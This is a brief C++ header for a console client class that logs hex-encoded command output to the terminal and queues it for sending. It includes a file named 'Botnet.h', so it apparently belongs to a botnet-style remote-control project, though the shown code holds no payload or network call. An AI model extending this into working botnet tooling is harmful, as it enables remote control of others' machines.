#pragma once
#include "IClient.h"
#include "Botnet.h"
#include <mutex>
#include <iomanip>
#include <iostream>
class ConsoleClient : public IClient {
public:
    ConsoleClient(){};
    void Send(const std::string& outputHex, bool isError) override {
        {
            std::lock_guard<std::mutex> lk(_mtx);
            if (isError) std::cout << "[ERR HEX] ";
            else std::cout << "[OUT/IN HEX] ";
            std::cout << outputHex << '\n';
        }
        
        EnqueueSend(outputHex);
    }
private:
    std::mutex _mtx;
};